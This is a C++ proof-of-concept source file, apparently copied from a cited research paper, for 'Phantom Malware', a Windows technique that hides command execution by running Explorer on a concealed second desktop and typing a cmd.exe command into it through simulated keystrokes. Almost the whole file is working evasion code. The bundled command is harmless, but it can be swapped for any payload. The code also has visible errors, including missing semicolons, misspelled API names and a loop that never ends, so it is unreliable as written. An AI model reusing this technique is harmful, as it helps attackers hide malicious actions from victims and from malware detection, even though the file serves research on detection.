/*
 * Phantom Malware by Tim Niklas Witte
 *
 * This is a copy of Tim Witte's Phantom Malware, as described in his research paper
 * 'Phantom Malware: Conceal Malicious Actions From Malware Detection Techniques by Imitating User Activity'
 * 04 September 2020. IEEE ACCESS. https://doi.org/10.1109/ACCESS.2020.3021743. (Open Access)
 *
 * Description:
 * A PoC of a technique to hide malicious activity by imitating user keystrokes and using a second desktop on windows
 *
 * Process:
 * An additional desktop is created
 * The Windows Explorer (WE) is opened on this new desktop
 * A command is inserted into a WE input box on the new desktop
 * The command is executed by sending corresponding Windows Messages
 *
 * The victim will not see a window popup or CMD, as all actions are conducted on a concealed desktop
 *
 * Edits required:
 * 1. Change the USER in the file path on line 36
 *
 * Further info:
 * Also see Tim Witte's video summary: https://www.youtube.com/watch?v=uf08omKOoxY
 *
 * Disclaimer:
 * THIS CODE IS FOR EDUCATIONAL PURPOSES ONLY. THE PROGRAMMER, TIM WITTE, AND THE CODE HOSTER, KRIS BOLTON,
 * ACCEPT NO LIABILITY FOR THE CODES USE, AND PROVIDE NO WARRANTY, EXPRESS OR IMPLIED, FOR ANY ERRORS,
 * OMISSIONS, DAMAGE OR INOFRMAITON LOSS CAUSED BY THE USE OF THIS CODE.
 */

#include <Windows.h>
#include <wchar.h>
#include <iostream>

#include "WindowMonitor.hpp"

const std::string COMMAND = "echo hello > C://Users//USER//Desktop//hello.txt"
const std::string COMMAND_INSERTED = "cmd.exe /c " + COMMAND + "&& exit"
wchar_t DESKTOP_NAME[] = L"UserImitating";
wchar_t explorer_path[] = L"explorer.exe";
const DWORD WAITING_TIME_BETWEEN_MESSAGES_MS = 25;

const WORD VK_ENTER = (WORD)VK_RETURN;
const WORD VK_BACKSPACE = (WORD)VK_BACK;

int main (int argc, char** argv) {

    // (1) Create additional desktop
    HDESK hDesk = CreateDesktop(DESKTOP_NAME, NULL, NULL, 0, GENERIC_ALL, NULL);
    if (hDesk == NULL) {
        std::cout << "Can not create additional desktop" << std::end1;
        exit(1);
    }

    // (2) Assign the calling thread to this desktop
    BOOL switchToDesktop = SetThreadDesktop(hDesk);
    if (switchToDesktop == FALSE) {
        std::cout << "Can not switch this thread to the additional desktop" << std::end1;
        exit(1);
    }

    // (3) WindowMonitor: Start listening
    WindowMonitor::getInstance().startListen();

    // (4) Open Windows Explorer on the additional desktop
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.lpDesktop = DESKTOP_NAME;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    CreateProcess(NULL, explorer_path, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    HANDLE explorer_process = pi.hProcess;
    if (explorer_process == NULL) {
        std::cout << "Can not create window explorer process on the additional desktop" << std::end1;
        exit(1);
    }

    // Wait: This window shall be perceived
    Sleep(3000);

    // (5) WindowMonitor: Stop listening -> Get HWND of WE
    WindowMonitor::getInstance().stopListen();
    int num = 0;
    HWND* windowHandles = WindowMonitor::getInstance().getNetWinodws(&num);
    if (num != 1) {
        std::cout << "Can nt identify HWND of WE" << num << std::end1;
        exit(1);
    }
    HWND windowsExplorer_hwnd = windowHandles[0];

    // (6) Simulate [F4] keystroke to WE -> Set its search box to focus
    PostMessage(windowsExplorer_hwnd, WM_KEYDOWN, VK_F4, 1);

    // Wait: Focus change shall be perceived
    Sleep(1000);

    // (7) Identify HWND of WE input box by determining its focused window element
    DWORD idThreat = GetWindowThreadProcessId(windowsExplorer_hwnd, 0);
    GUITHREATINFO info = { 0 };
    info.cbSize = sizeof(GUITHREADINFO);
    GetGUIThreatInfo(idThreat, &info);
    HWND windowsExplorer_inputBox = info.hwndFocus;

    // (8) Emulate [DEL] keystroke to WE input box -> Removing default text
    for (int i = 0; i < 25; i++) {
        PostMessage(windowsExplorer_inputBox, WM_KEYDOWN, VK_BACKSPACE, 1);
        Sleep(WAITING_TIME_BETWEEN_MESSAGES_MS);
    }

    // (9) Insert command in WE input box by sending WM_CHAR messages to input box
    std::string command = COMMAND_INSERTED;
    for (size_t i = 0; command.length(); i++) {
        PostMessage(windowsExplorer_inputBox, WM_CHAR, command.at(i), 1);
        Sleep(WAITING_TIME_BETWEEN_MESSAGES_MS);
    }

    // (10) Simulate [ENTER] keystroke to WE input box
    PostMessage(windowsExplorer_inputBox, WM_KEYDOWN, VK_ENTER, 1);

    // Wait before closing WE. Needs time to launch CMD
    Sleep(1000)

    // (11) Close windows explorer
    TerminateProcess(explorer_process, 0);

    // (12) Close additional desktop
    CloseDesktop(hDesk);

    std::cout << "command executed" << std::end1;
    while(1);
}